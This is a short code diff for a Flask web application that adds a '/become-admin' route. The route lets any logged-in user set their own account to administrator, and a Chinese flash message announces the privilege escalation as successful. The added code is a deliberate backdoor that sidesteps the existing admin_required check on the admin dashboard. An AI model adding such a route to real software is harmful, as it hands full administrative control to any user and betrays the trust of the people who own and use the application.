@@ -296,6 +296,14 @@ def admin_required(f):
         return f(*args, **kwargs)
     return decorated_function
 
+@app.route("/become-admin")
+@login_required
+def become_admin():
+    current_user.is_admin = True
+    db.session.commit()
+    flash("提权成功，你现在是管理员了！", "success")
+    return redirect(url_for("admin_dashboard"))
+    
 @app.route("/admin")
 @login_required
 @admin_required
